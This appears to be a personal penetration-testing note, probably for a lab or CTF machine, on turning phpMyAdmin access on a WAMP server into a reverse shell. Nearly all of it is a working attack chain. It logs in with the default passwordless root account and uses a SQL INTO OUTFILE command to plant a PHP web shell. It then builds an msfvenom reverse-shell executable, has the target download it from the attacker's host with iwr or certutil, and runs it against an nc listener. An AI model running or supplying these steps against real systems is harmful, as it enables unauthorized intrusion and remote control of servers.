### phpmyadmin reverse shell
###### default credentials are 
```powershell
root:
```
no password


###### 1- get [root_path](6-%20Zettelkasten/root_path.md)
since we can access phpmyadmin, then we can [[get a reverse shell with mysql command injection]]
by going to [[/phpmyadmin/libraries/config.default.php]], we can see that our [[6- Zettelkasten/root_path]] is going to be  `C:\wamp\apps\` as you can see below 
![800](Assets/Pasted%20image%2020250720132504.png)


###### 2- execute the reverse shell creator command 
replace `C:/wamp/www` with your [root_path](6-%20Zettelkasten/root_path.md) value.
```powershell
select "<?php echo shell_exec($_GET['c']);?>" into OUTFILE 'C:/wamp/www/webshell.php'
```
![600](Assets/Pasted%20image%2020250720134430.png)
This command is attempting to create a new file named `webshell.php` in the `C:/wamp/www/` directory. The content of this file will be a simple PHP script: `<?php echo shell_exec($_GET['c']);?>`.

This script is a basic web shell. If the command is successful, we could then access this file through a web browser and execute arbitrary commands on the server by passing them as a parameter in the URL (e.g., `http://<% tp.frontmatter["RHOSTS"] %>:8080/webshell.php?c=whoami).

###### geenrate reverse shell 
```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=135 -f exe -o reverse.exe
```

start a python upload server 
```powershell
python3 -m http.server 80
```
upload it 
```powershell
iwr -uri http://<% tp.frontmatter["LHOST"] %>/reverse.exe -Outfile C:/wamp/www/reverse.exe
powershell -c "Invoke-WebRequest -Uri 'http://<% tp.frontmatter["LHOST"] %>/reverse.exe' -OutFile 'C:/wamp/www/reverse.exe'"
certutil -urlcache -split -f "http://<% tp.frontmatter["LHOST"] %>/reverse.exe" C:/wamp/www/reverse.exe
```

start listener 
```powershell
rlwrap -cAr nc -lvnp 135
```

execute it 
```powershell
http://<% tp.frontmatter["RHOSTS"] %>:8080/webshell.php?c=C:/wamp/www/reverse.exe
```

